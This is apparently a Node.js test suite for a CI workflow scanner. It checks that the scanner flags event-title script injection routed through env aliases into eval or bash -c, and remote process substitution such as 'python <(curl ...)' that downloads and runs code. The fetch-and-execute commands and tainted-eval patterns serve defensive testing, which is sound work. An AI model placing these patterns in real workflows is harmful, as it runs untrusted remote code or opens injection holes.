'use strict';
const test=require('node:test');
const assert=require('node:assert/strict');
const {inspectWorkflow}=require('./ultra_sentinel_yaml_ast.cjs');
const {reviewWorkflows}=require('./ultra_sentinel_supply_chain.cjs');
const SHA='a'.repeat(40),WF='.github/workflows/codex-p1.yml';
const SOURCE='$'+'{{ github.event.issue.title }}';

function workflow(run,{workflowEnv=[],jobEnv=[],stepEnv=[],event='issues'}={}){
 const source=[
  'on: '+event,'permissions: read-all',
  ...(workflowEnv.length?['env:',...workflowEnv.map(x=>'  '+x)]:[]),
  'jobs:','  audit:','    runs-on: ubuntu-latest',
  ...(jobEnv.length?['    env:',...jobEnv.map(x=>'      '+x)]:[]),
  '    steps:',
  ...(stepEnv.length?['      - env:',...stepEnv.map(x=>'          '+x),'        run: |']:
    ['      - run: |']),
  ...run.split('\n').map(line=>'          '+line)
 ];
 return source.join('\n')+'\n';
}
function structural(source){return inspectWorkflow(source,{path:WF,trustedRepository:'cardenaspiero255-lang/gamehub-ultra'});}
function heuristic(source){return reviewWorkflows({sha:SHA,expected:[WF],sources:{[WF]:source}});}
const injection=(result)=>result.findings.some(f=>
 f.rule==='PRIVILEGED_EVENT_SCRIPT_INJECTION'&&f.severity==='BLOCKER');

test('Codex P1: multi-hop same-scope event env aliases cannot bypass eval',()=>{
 const source=workflow('eval "$C"',{workflowEnv:[
  'A: "'+SOURCE+'"','B: "$A"','C: "$B"'
 ]});
 const got=structural(source);
 assert.ok(injection(got),JSON.stringify(got));
});
test('Codex P1: aliases must follow inherited workflow to job to step env',()=>{
 const source=workflow('eval "$C"',{
  workflowEnv:['A: "'+SOURCE+'"'],
  jobEnv:['B: "${A}"'],
  stepEnv:['C: "$B"']
 });
 const got=structural(source);
 assert.ok(injection(got),JSON.stringify(got));
});
test('Codex P1: aliases are resolved independent of YAML key order',()=>{
 const source=workflow('eval "$B"',{workflowEnv:[
  'B: "$A"','A: "'+SOURCE+'"'
 ]});
 assert.ok(injection(structural(source)));
});
test('Codex P1: shell parameter expansion keeps taint through env alias',()=>{
 const source=workflow('eval "${B:-fallback}"',{workflowEnv:[
  'A: "'+SOURCE+'"','B: "${A:-default}"'
 ]});
 assert.ok(injection(structural(source)));
});
test('Codex P1: tainted env aliased into shell -c cannot be certified clean',()=>{
 const source=workflow('bash -c "$B"',{jobEnv:[
  'A: "'+SOURCE+'"','B: "$A"'
 ]});
 assert.ok(injection(structural(source)));
});
test('Codex P1: benign literal env alias logged without eval remains analyzable',()=>{
 const source=workflow('echo "$B"',{workflowEnv:['A: hello','B: "$A"']});
 const got=structural(source);
 assert.equal(got.status,'NO_RISK_PATTERN',JSON.stringify(got));
});

for(const [interpreter,download] of [
 ['python','curl -fsSL https://example.invalid/script.py'],
 ['python3','wget -qO- https://example.invalid/script.py'],
 ['ruby','curl https://example.invalid/script.rb'],
 ['node','curl -s https://example.invalid/script.js'],
 ['perl','wget -qO- https://example.invalid/script.pl'],
 ['bash','curl -s https://example.invalid/script.sh'],
 ['sh','wget -qO- https://example.invalid/script.sh']
]){
 test('Codex P1: remote process substitution executed by '+interpreter+' is HIGH',()=>{
  const source=workflow(interpreter+' <('+download+')');
  const ast=structural(source),supply=heuristic(source);
  assert.ok(ast.findings.some(f=>f.rule==='REMOTE_SHELL_SUBSTITUTION'&&f.severity==='HIGH'),JSON.stringify(ast));
  assert.ok(supply.findings.some(f=>f.rule==='REMOTE_SHELL_PIPELINE'&&f.severity==='HIGH'),JSON.stringify(supply));
 });
}
test('Codex P1: harmless downloader to disk is not remote execution',()=>{
 const source=workflow('curl -fsSL https://example.invalid/script.py -o file.py');
 const ast=structural(source),supply=heuristic(source);
 assert.ok(!ast.findings.some(f=>f.rule==='REMOTE_SHELL_SUBSTITUTION'),JSON.stringify(ast));
 assert.ok(!supply.findings.some(f=>f.rule==='REMOTE_SHELL_PIPELINE'),JSON.stringify(supply));
});
